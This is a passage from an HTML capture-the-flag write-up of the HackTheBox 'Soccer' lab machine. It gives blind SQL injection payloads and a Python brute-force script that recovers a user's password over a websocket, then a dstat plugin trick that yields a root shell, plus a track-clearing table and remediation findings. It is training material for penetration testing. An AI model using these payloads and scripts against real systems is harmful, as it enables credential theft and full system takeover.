+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%204.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%204.png"/>
+          </a>
+        
+        <p id="d981e55c-9825-4cfc-859b-dba55d688a59">
+          This web applications looks like the one we used to gain a foothold, but if we take a look at the navigation bar, we can see that there is more pages available. It seems we can create an account and sign in to the web application. Let’s click on Signup and create an account :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%205.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%205.png"/>
+          </a>
+        
+        <p id="4d82ba4b-65f3-4f32-8b41-f9744457ce54">
+          Now, we can login to the wab application :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%206.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%206.png"/>
+          </a>
+        
+        <p id="8052b86c-1b3a-40c0-bd72-c34d30e0e336">
+          After logging in, we are reditected to this web page :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%207.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%207.png"/>
+          </a>
+        
+        <p id="6e942ac3-15e9-4e08-ab37-4b195d2efabd">
+          As you can see, we are redirected to a page that asks us for a ticket number. We can use BurpSuite to capture the request sent when entering a ticket number to see how the value is sent to the web server :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%208.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%208.png"/>
+          </a>
+        
+        <p id="716374df-ff95-4345-87a5-2b46cff5b08f">
+          The ticket number is sent in a Json variable named id to a websocket server on port 9091. We can check if it is vulnerable to an SQL injection. 
+        </p>
+        <h2 id="d54bd208-438a-49b9-ba27-a5f70ba7ba87">
+          
+            Privilege escalation (player)
+          
+        </h2>
+        <p id="9f2049cb-7f4a-4c3a-b1e8-8ec69b943bd9">
+          If we enter the ticket number provided by the web application, we receive “Ticket exists”, if not, we receive “Ticket Doesn’t Exist”. But if we try to enter an operation like 70904+1 (since my ticket number is 70905), we receive a valid ticket message 
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%209.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%209.png"/>
+          </a>
+        
+        <p id="2f3f442b-3923-4dce-ab3f-4f2afa6b0c63">
+          So, the operation is interpreted. This is a sign that it may be vulnerable to SQL injections since SQL can interpret operations like the one above. Since it only respond with “valid” or “invalid” response, it may be vulnerable to boolean based blind SQL injections. 
+        </p>
+        <p id="8c0f1c14-d6f9-4d26-9361-03dd9b4b8bda">
+          Let’s check if it’s vulnerable to boolean based blind SQL injection :
+        </p>
+        <ul id="e58fb133-556b-4782-857f-3f8863e12b22">
+          <li>
+            <code>
+              0 OR 1;
+            </code>
+             returns “Ticket Exists”
+          </li>
+        </ul>
+        <ul id="5aaedf46-1282-4f10-bd9b-3b4355fec944">
+          <li>
+            <code>
+              0 OR 0;
+            </code>
+             returns “Ticket Doesn’t Exist”
+          </li>
+        </ul>
+        <p id="726a4166-8ec2-4c83-9e40-419b4b55a0b4">
+          So, it is vulnerable to boolean based blind SQL injections.
+        </p>
+        <p id="9f731daa-afa7-4d54-81a1-c890cae89f6d">
+          Let’s try to enumerate tables. Since we can create an account an login to the web application, there must be an accounts table or a user table :
+        </p>
+        <ul id="5876df8e-0c39-4247-b209-5e94da692c7f">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT table_name FROM information_schema.tables WHERE table_name = &#x27;aaaaaaaaaaa&#x27;);
+            </code>
+             → “Ticket Doesn’t Exist”
+          </li>
+        </ul>
+        <ul id="145a84fd-9898-440b-be8a-9670e30f63b6">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT table_name FROM information_schema.tables WHERE table_name = &#x27;accounts&#x27;);
+            </code>
+             → “Ticket Exists”
+          </li>
+        </ul>
+        <p id="2f581c20-eb05-4917-bf86-4bdfe4b213a7">
+          There is a table named accounts. Let’s enumerate columns from this table :
+        </p>
+        <ul id="cc0f9a17-e2d6-4ca7-a093-4d3b61694b43">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT column_name FROM information_schema.columns WHERE column_name = &#x27;password&#x27; AND TABLE_NAME = &#x27;aaaaaaaaaaaaa&#x27;);
+            </code>
+             → “Ticket Doesn’t Exist”
+          </li>
+        </ul>
+        <ul id="c1a9da13-b9dd-47ff-87f4-9215929bb57f">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT column_name FROM information_schema.columns WHERE column_name = &#x27;password&#x27; AND TABLE_NAME = &#x27;accounts&#x27;);
+            </code>
+             → “Ticket Exists”
+          </li>
+        </ul>
+        <ul id="60c1fb4e-e7b3-4530-bad3-d2eb34228e16">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT column_name FROM information_schema.columns WHERE column_name = &#x27;username&#x27; AND TABLE_NAME = &#x27;accounts&#x27;);
+            </code>
+             → “Ticket Exists”
+          </li>
+        </ul>
+        <p id="1fbae2b1-0a5a-4ae9-bfed-b7ca4779ee48">
+          We found the password column and the username column, let’s see if the player user created an account on the web application :
+        </p>
+        <ul id="96415abc-9db2-4534-bbf5-4aef3a5bc809">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT username FROM accounts WHERE username = &#x27;aaaaaaaaa&#x27;);
+            </code>
+             → “Ticket Doesn’t Exist”
+          </li>
+        </ul>
+        <ul id="4a7f3c6e-89d6-4dcf-afcc-2e4508d526b3">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT username FROM accounts WHERE username = &#x27;player&#x27;);
+            </code>
+             → “Ticket Exists”
+          </li>
+        </ul>
+        <p id="dd664b4a-bde1-4d5e-bb93-299d6799ff11">
+          It seems that the player user has an account on the web application. Let’s get his password by bruteforcing each characters :
+        </p>
+        <ul id="c4a81378-3cd1-4205-a372-5bfdbf433dfc">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT password FROM accounts WHERE username = &#x27;player&#x27; AND BINARY SUBSTRING(password,1,1) = &#x27;a&#x27;);
+            </code>
+             → “Ticket Doesn’t Exist”
+          </li>
+        </ul>
+        <ul id="d0c9356f-8ca2-4bf7-a348-c25f03611827">
+          <li>
+            <code>
+              0 OR EXISTS (SELECT password FROM accounts WHERE username = &#x27;player&#x27; AND BINARY SUBSTRING(password,1,1) = &#x27;b&#x27;);
+            </code>
+             → “Ticket Doesn’t Exist”
+          </li>
+        </ul>
+        <ul id="3f2b20b8-3a7d-4e72-8fe3-db336554065a">
+          <li>
+            …
+          </li>
+        </ul>
+        <p id="73a7d37f-6219-482f-b750-aeab1d06ced2">
+          Alternatively, We can write a python script to find the password faster :
+        </p>
+        
+        
+        
+<pre id="8c83e78f-6db6-4c69-9642-71655c647e3f" class="code"><code>from websocket import create_connection
+import string
+
+ws = create_connection(&quot;ws://soc-player.soccer.htb:9091/&quot;)
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+def brute():
+    password = &quot;&quot;
+    while True:
+        for i in range(len(charset)):
+            payload = &#x27;&#x27;&#x27;{&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \\&quot;player\\&quot; AND BINARY SUBSTR(password,&#x27;&#x27;&#x27;
+            payload += &quot;{},1) = &quot;.format(len(password) + 1)
+            payload += &quot;&#x27;{}&#x27;)-- -&quot;.format(charset[i])
+            payload += &quot;\&quot;}&quot;
+            print(&quot;Using payload :&quot;,payload)
+            ws.send(payload)
+            result = ws.recv()
+            if result == &quot;Ticket Exists&quot;:
+                password = password + charset[i]
+                
+                #Test if end of password reached
+                inject = &#x27;&#x27;&#x27;{&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \\&quot;player\\&quot; AND password = \\&quot;&#x27;&#x27;&#x27;
+                inject += password + &#x27;&#x27;&#x27;\\&quot;)-- -&quot;}&#x27;&#x27;&#x27;
+                ws.send(inject)
+                result = ws.recv()
+                if result == &quot;Ticket Exists&quot;:
+                    print(&quot;Password found :&quot;,password)
+                    return
+                break
+
+brute()</code></pre>
+        <p id="db09da27-1fe1-485e-8473-ceff8d4c42f3">
+          Let’s run this script to brute the password automatically :
+        </p>
+        
+        
+        
+<pre id="c77ae986-e9ae-4f60-8739-a664d1af8fa8" class="code"><code>┌─[cyberretta@parrot]─[~]
+└──╼ $python3 sqli.py 
+Using payload : {&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \&quot;player\&quot; AND BINARY SUBSTR(password,1,1) = &#x27;a&#x27;)-- -&quot;}
+Using payload : {&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \&quot;player\&quot; AND BINARY SUBSTR(password,1,1) = &#x27;b&#x27;)-- -&quot;}
+[CROPPED]
+Using payload : {&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \&quot;player\&quot; AND BINARY SUBSTR(password,20,1) = &#x27;2&#x27;)-- -&quot;}
+Password found : PlayerOftheMatch2022</code></pre>
+        <p id="c338f13a-19cd-4ba2-8186-1500f9f34675">
+          We found the password of player user account. If this user used the same password for his local user account, we can escalate our privileges to this user :
+        </p>
+        
+        
+        
+<pre id="f5e0f286-54d6-42ea-936c-261d144a1897" class="code"><code>(remote) www-data@soccer:/var/www/html/tiny/uploads$ su player
+Password: 
+player@soccer:/var/www/html/tiny/uploads$ id
+uid=1001(player) gid=1001(player) groups=1001(player)</code></pre>
+        <p id="1fdbe878-12ec-4125-93f2-88bc6ddf4a8a">
+          We have now a shell as player.
+        </p>
+        <h2 id="d42af8f3-77a3-42d0-a49a-446dfabb4f2a">
+          
+            Privilege escalation (root)
+          
+        </h2>
+        <p id="202a92e8-e3ab-4a59-b5cb-f656d84c4229">
+          Let’s see if there is any interesting binaries with the SUID bit enabled :
+        </p>
+        
+        
+        
+<pre id="d71ca8f2-a614-41ff-8c70-916176e6fa77" class="code"><code>player@soccer:/var/www/html/tiny/uploads$ find / -type f -perm -4000 2&gt;/dev/null
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+/snap/snapd/17883/usr/lib/snapd/snap-confine
+/snap/core20/1695/usr/bin/chfn
+/snap/core20/1695/usr/bin/chsh
+/snap/core20/1695/usr/bin/gpasswd
+/snap/core20/1695/usr/bin/mount
+/snap/core20/1695/usr/bin/newgrp
+/snap/core20/1695/usr/bin/passwd
+/snap/core20/1695/usr/bin/su
+/snap/core20/1695/usr/bin/sudo
+/snap/core20/1695/usr/bin/umount
+/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1695/usr/lib/openssh/ssh-keysign</code></pre>
+        <p id="9b1b42e4-0146-4b1b-a00b-07423e0708f4">
+          As we can see, doas is installed on the system. We can take a look at the configuration file of doas to see if we can run any binaries as root :
+        </p>
+        
+        
+        
+<pre id="ec6128f7-8e95-49a4-8e2b-1cef389c87e7" class="code"><code>player@soccer:/var/www/html/tiny/uploads$ find / -type f -name &quot;doas.conf&quot; 2&gt;/dev/null
+/usr/local/etc/doas.conf
+player@soccer:/var/www/html/tiny/uploads$ cat /usr/local/etc/doas.conf 
+permit nopass player as root cmd /usr/bin/dstat</code></pre>
+        <p id="4a58730e-91c3-4f7a-90ed-83326cc6188f">
+          We can run dstat as root without password.
+        </p>
+        <blockquote id="5a9ff340-47a3-44c9-9c2c-7ca44400976c">
+          Dstat is a versatile replacement for vmstat, iostat and ifstat. Dstat overcomes some of the limitations and adds some extra features.
+          <p id="e254fe8f-10b3-4804-a891-8529542ae99b">
+            Dstat allows you to view all of your system resources instantly, you can eg. compare disk usage in combination with interrupts from your IDE controller, or compare the network bandwidth numbers directly with the disk throughput (in the same interval).
+          </p>
+        </blockquote>
+        <p id="cf48b6fe-4b69-49d2-bb85-1d942ebe41f0">
+          Dstat can run python plugins. We may be able to create a malicious python script and run it thought dstat as root to gain a shell as root. According to the dstat manual, we can create a custom python plugin in the following locations :
+        </p>
+        
+        
+        
+<pre id="820fe026-402a-48ef-9ee6-40c883bf84a7" class="code"><code>FILES
+       Paths that may contain external dstat_*.py plugins:
+
+           ~/.dstat/
+           (path of binary)/plugins/
+           /usr/share/dstat/
+           /usr/local/share/dstat/</code></pre>
+        <p id="2ba38a69-98dc-4805-ac13-b3a0eda21a2b">
+          If we take a look at the last path, we can see that it is writable by the player user :
+        </p>
+        
+        
+        
+<pre id="3b2f0a80-9cf3-45cd-8149-6f068fc4b7ac" class="code"><code>player@soccer:/var/www/html/tiny/uploads$ ls -la /usr/local/share/dstat/
+total 8
+drwxrwx--- 2 root player 4096 Dec 12  2022 .
+drwxr-xr-x 6 root root   4096 Nov 17  2022 ..</code></pre>
+        <p id="0398b880-0ac9-4dfc-a182-35958d543e81">
+          Now, let’s create the malicious python script and execute it through dstat :
+        </p>
+        
+        
+        
+<pre id="5a36a8e3-b5d2-414b-bd69-b1759ff011dd" class="code"><code>player@soccer:/var/www/html/tiny/uploads$ echo &#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27; &gt; /usr/local/share/dstat/dstat_exploit.py
+player@soccer:/var/www/html/tiny/uploads$ doas -u root /usr/bin/dstat --exploit
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#x27;s documentation for alternative uses
+  import imp
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#</code></pre>
+        <p id="63aad9b6-d11f-4597-a07a-6309a8ff0a4d">
+          We have now a shell as root !
+        </p>
+        <h1 id="f49d1e4d-e92d-4e74-a62a-fe314954d669">
+          Clearing tracks
+        </h1>
+        <table id="ba1118f6-18a6-4e3d-bf89-52ae2e1fcaa7">
+          <thead>
+            <tr id="775df79a-670b-4fcc-a926-8cccc62e7579">
+              <th id="xDBb">
+                Step
+              </th>
+              <th id="^z&gt;Y">
+                Tracks to remove
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="fb742187-338a-48a5-8ac8-21b9abdcac05">
+              <td id="xDBb">
+                Initial access
+              </td>
+              <td id="^z&gt;Y">
+                - Remove shell.php from /var/www/html/tiny/uploads
+              </td>
+            </tr>
+            <tr id="6ac1fc4f-7e20-4076-89cf-ef86ba32439c">
+              <td id="xDBb">
+                Post-Exploitation - Privilege escalation (root)
+              </td>
+              <td id="^z&gt;Y">
+                - Remove dstat_exploit.py from /usr/local/share/dstat/
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="77024be1-5d39-4674-bb54-f69b95c8c0ad">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="dd08ff65-876f-45ee-bc99-08b0079075f0">
+          
+            Default credentials
+          
+        </h2>
+        <table id="52369fee-3661-42d1-a12f-a67fe9417d81">
+          <thead>
+            <tr id="921c0ab0-6d81-4673-a211-283116d3959c">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="8e938cc4-9ac3-48d5-9b2b-9e6a0f672076">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Tiny File Manager
+              </td>
+            </tr>
+            <tr id="444f4312-e6c2-4a69-9aa2-517865784605">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  9.8
+                
+              </td>
+            </tr>
+            <tr id="a8a20389-c3d5-4904-abb1-c9b8b67132cc">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  CRITICAL
+                
+              </td>
+            </tr>
+            <tr id="cd4b2325-fafb-4506-a798-42f69327f222">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="18faa006-6251-4098-9436-4951ef982690">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to access the Tiny File Manager and upload a malicious PHP file to gain a foothold on the system as www-data. 
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality, integrity and availability
+                  
+                
+                
+                   of the affected component.
+                
+              </td>
+            </tr>
+            <tr id="111a2608-1796-431b-a666-75cee0ffca26">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Change the default credentials (for both admin and user account) and use a strong password.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="6fee4375-558b-410b-853d-994935abf838">
+          
+            Web server misconfiguration
+          
+        </h2>
+        <table id="900f23fb-6187-4f0c-a0c9-6bffd78bcf8a">
+          <thead>
+            <tr id="835bf1b0-f071-4289-bd19-0d7f7dc932d4">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="5acccd23-90d7-49d0-b1d4-bf584e16d218">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Nginx
+              </td>
+            </tr>
+            <tr id="ed01e67a-0031-472e-95f0-783b0e3991ec">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  8.8
+                
+              </td>
+            </tr>
+            <tr id="9b8545ce-4408-4ddc-ab1e-6fc247c57735">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="81c6b08a-c5c3-42bb-b492-1893b99e4043">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="226e2525-111d-4375-b3a9-6e550c7c3f12">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                If an attacker gains access to Tiny File Manager, he is able to upload a webshell in the uploads directory and gain a foothold on the system as www-data.
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="a9ddcb5a-2958-4b56-8c0e-0950c14192a6">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Either blacklist PHP files from the upload functionality, or change the nginx configuration to disable execution of PHP files in the /uploads directory.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="c8018a1b-58ae-4a70-9857-c0137f1f6da3">
+          
+            Structured Query Language injection
+          
+        </h2>
+        <table id="be701948-f22e-4015-b3ed-f4e5e8ba66f1">
+          <thead>
+            <tr id="8dd149b7-4133-49df-bc3a-250ba4c7abb3">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="3d80fc7d-a6b2-4d1b-9f91-9502ad97419c">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Websocket server
+              </td>
+            </tr>
+            <tr id="00013ce9-7232-4575-af54-2377243bec10">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.5
+                
+              </td>
+            </tr>
+            <tr id="853b7583-967b-48f7-a964-0918109cc585">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="161f2516-ce70-4364-949e-86410eed4636">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="abc41410-bf12-4f3c-abf3-5c9d3b522611">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to injecte arbitrary SQL code and retrieve data from the MySQL databases. 
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="49b53b02-73bc-49e7-900c-9fdd5d374a2d">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Sanitize data sent in the id parameter to the websocket
+                
+                
+                - You could also set up a WAF to detect and block malicious traffic such as SQL injection attempts
+                
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="e74da1f5-2fe9-462c-a43c-c9a3fabb24bd">
+          
+            Clear-text credentials
+          
+        </h2>
+        <table id="d06b02df-c655-4fbc-b69e-617f10b69c27">
+          <thead>
+            <tr id="1b41ed87-c32a-4df2-9079-0d1e77dbcd17">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="7a3c7374-020f-4fde-807e-9398315a41b8">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                MySQL database
+              </td>
+            </tr>
+            <tr id="fcb926da-b6e8-4e7d-93fe-f5df340b0c63">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.5
+                
+              </td>
+            </tr>
+            <tr id="e9676364-2de6-4b12-9913-3588ad783d76">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="c0bdff04-5785-47b3-a5e3-a3e2102c28b8">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="1fe02e4c-a43c-49ff-91d9-3e9c8d6bb920">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                If an attacker has access to the database, he is able to read clear text passwords.
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="c01ee0d9-7f7c-49c8-9159-9a0033faa61f">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Don’t store clear-text passwords. Instead, store hashes using strong algorithm like Argon 2, Bcrypt or Scrypt.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="7a869503-9393-4f42-95e2-c79d487d92bb">
+          
+            Improper access control
+          
+        </h2>
+        <table id="f8d279c4-37e5-44d5-a378-97e1a97c341d">
+          <thead>
+            <tr id="5d327e1b-aee5-4592-9b1d-2dea667bd2a2">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="12827a68-f01a-4194-8f12-b8445735607f">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Local system
+              </td>
+            </tr>
+            <tr id="561af14b-f222-4c3e-822a-daa6be9e72a7">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  8.4
+                
+              </td>
+            </tr>
+            <tr id="4a1eb9ce-1757-41dd-bfee-b44dffd190b2">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="749fb0b2-9ce3-4ac3-a584-7c31cf962057">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="ad447f64-8731-402a-be9c-4da2eeb908d9">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                If an attacker gains access to the player user account, he can write malicious python scripts in the dstat plugin directory. Since player user can run dstat as root, an attacker can leverage this to execute arbitrary code as root and gain access to the entire system.
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="ce77c867-8d99-4419-b2e5-c3f82ddd6643">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Change the group of /usr/local/share/dstat from player to root. This way, player user cannot run arbitrary python code as root.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="ac9838f8-1b12-4a55-a39c-12f463c5cbe3">
+          Tools used
+        </h1>
+        <table id="f88c7eb8-89cf-441c-a45d-5cee326e7cc8">
+          <thead>
+            <tr id="a6fc33b1-6557-41af-8098-ee3c74f8bfc4">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="dbe7d15e-1ef0-4fbc-a746-0ef186665db5">
+              <td id="`&gt;MF">
+                nmap
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan for services versions
+                
+              </td>
+            </tr>
+            <tr id="2519027b-fb0b-40a2-b745-a19ac7b9bdea">
+              <td id="`&gt;MF">
+                pwncat-cs
+              </td>
+              <td id="A|qY">
+                - Handle reverse shell connection
+              </td>
+            </tr>
+            <tr id="65cf6787-9b1a-4a1c-8259-dc4bd3ae36ba">
+              <td id="`&gt;MF">
+                BurpSuite
+              </td>
+              <td id="A|qY">
+                - Capture and edit web requests
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="41d8c6cc-2060-497a-b01a-42897017076c">
+          Sources
+        </h1>
+        <ul id="40e3dbe4-f451-44ad-b6da-19b68ef7c072">
+          <li>
+            Dstat manual : 
+            <a href="https://linux.die.net/man/1/dstat">
+              https://linux.die.net/man/1/dstat
+            </a>
+          </li>
+        </ul>
+        <ul id="6561ce07-a5c5-444f-ba67-853d76237729">
+          <li>
+            Dstat privilege escalation : 
+            <a href="https://gtfobins.github.io/gtfobins/dstat/">
+              https://gtfobins.github.io/gtfobins/dstat/
+            </a>
+          </li>
+        </ul>
+        <p id="824d686b-8764-46fb-bfb3-feefb182b425">
+          
+
+        </p>
+      </div>
+    
+    <span>
+    </span>
+  
+
